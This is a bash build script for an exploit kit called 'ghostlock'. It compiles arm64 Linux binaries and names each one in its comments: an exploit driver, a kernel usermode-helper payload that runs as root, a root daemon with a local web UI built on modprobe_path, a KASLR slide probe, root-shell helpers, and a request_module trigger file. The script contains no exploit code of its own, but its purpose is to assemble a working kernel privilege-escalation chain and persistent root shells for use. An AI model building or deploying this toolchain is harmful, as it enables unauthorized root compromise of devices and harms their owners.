#!/bin/bash
# build14.sh - build every ghostlock artifact from THIS repo.
#
# Usage:  bash tools/build14.sh [outbase]      # default /tmp/ghostlock
#
# Must run on an arm64 Linux host or WSL with:
#   aarch64-linux-gnu-gcc   xxd   file
#
# Outputs (also copied back to the repo root as <base>_*):
#   <base>_a64             exploit driver (the main binary)
#   <base>_dnroot_a64      UMH payload (kernel execs it as root)
#   <base>_mpnl_a64        root daemon + localhost web UI  (the modprobe_path helper)
#   <base>_slideprobe_a64  KASLR slide probe (perf IP sampler, read-only)
#   <base>_mphelper_a64    legacy file-channel root helper (rcmd -> rout)
#   <base>_getid_a64       tiny uid/euid probe
#   <base>_trigger_a64     futex PI reachability probe (standalone)
#   <base>_rsd_a64         diagnostic runner for the root-shell daemon
#   <base>_pwn2            the 4x0xFF request_module() trigger file
set -e
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"

OUT=${1:-/tmp/ghostlock}
BASE="$(basename "$OUT")"
CC=${CC:-aarch64-linux-gnu-gcc}

DRIVER_SRC="src/core/main.c src/core/util.c src/core/slide.c src/core/fops.c \
src/core/pipe_physrw.c src/core/root.c src/core/miniadb.c src/core/umh_root.c \
src/tools/glshell.c src/primitives/rootshell.c"
DNROOT_SRC="src/payload/dnroot.c src/primitives/rootshell.c"

# NOTE: the -DTARGET_CONFIG_H='"target.h"' quoting is load-bearing (the C macro
# must expand to a quoted include) - keep it exactly like this.
CORE_FLAGS=(-O2 -w -include stddef.h -Isrc/core -Isrc/devices -DTARGET_CONFIG_H='"target.h"')

fail() { echo "=== BUILD FAILED ($1) ==="; grep -iE 'error|undefined' /tmp/gl_build.err | head -40; exit 1; }

echo "=== build driver: -> ${OUT} ==="
if ! $CC -O2 -w -include stddef.h -DKERNELSNITCH_THRESHOLD_MULT=30 \
      -Isrc/core -Isrc/devices -DTARGET_CONFIG_H='"target.h"' \
      $DRIVER_SRC -o "$OUT" -static -pthread 2>/tmp/gl_build.err; then
  fail driver
fi
file "$OUT"
cp -f "$OUT" "$ROOT/${BASE}_a64"

build() { # build <suffix> <src...>
  local suffix="$1"; shift
  echo "=== build ${suffix#_}: -> ${OUT}${suffix} ==="
  if ! $CC "${CORE_FLAGS[@]}" "$@" -o "${OUT}${suffix}" -static 2>/tmp/gl_build.err; then
    fail "${suffix#_}"
  fi
  file "${OUT}${suffix}"
  cp -f "${OUT}${suffix}" "$ROOT/${BASE}${suffix}_a64"
}

build "_dnroot"    $DNROOT_SRC
build "_slideprobe" src/tools/slideprobe.c
build "_mphelper"  src/primitives/mphelper.c src/primitives/rootshell.c
build "_getid"     src/tools/getid.c
build "_rsd"       src/tools/rsd.c src/primitives/rootshell.c

# trigger needs pthread and no repo headers
echo "=== build trigger: -> ${OUT}_trigger ==="
if ! $CC -O2 -w -pthread src/tools/trigger.c -o "${OUT}_trigger" -static 2>/tmp/gl_build.err; then
  fail trigger
fi
file "${OUT}_trigger"
cp -f "${OUT}_trigger" "$ROOT/${BASE}_trigger_a64"

echo "=== build mpnl (root daemon + web UI): -> ${OUT}_mpnl ==="
# Embed the single-page UI (src/primitives/webui.html) as a C array.
if ! xxd -i -n webui_html src/primitives/webui.html > src/primitives/webui_html.h; then
  echo "=== WEBUI HEADER GEN FAILED (xxd missing?) ==="; exit 1
fi
if ! $CC -O2 -w src/primitives/mpnl.c -o "${OUT}_mpnl" -static 2>/tmp/gl_build.err; then
  fail mpnl
fi
file "${OUT}_mpnl"
cp -f "${OUT}_mpnl" "$ROOT/${BASE}_mpnl_a64"

echo "=== generate pwn2 (4x0xFF trigger) ==="
printf '\xff\xff\xff\xff' > "${OUT}_pwn2"
cp -f "${OUT}_pwn2" "$ROOT/${BASE}_pwn2"

echo "=== ok ==="
ls -la "$ROOT/${BASE}_a64" "$ROOT/${BASE}_dnroot_a64" "$ROOT/${BASE}_mpnl_a64" \
       "$ROOT/${BASE}_slideprobe_a64" "$ROOT/${BASE}_mphelper_a64" \
       "$ROOT/${BASE}_getid_a64" "$ROOT/${BASE}_trigger_a64" "$ROOT/${BASE}_rsd_a64" \
       "$ROOT/${BASE}_pwn2"
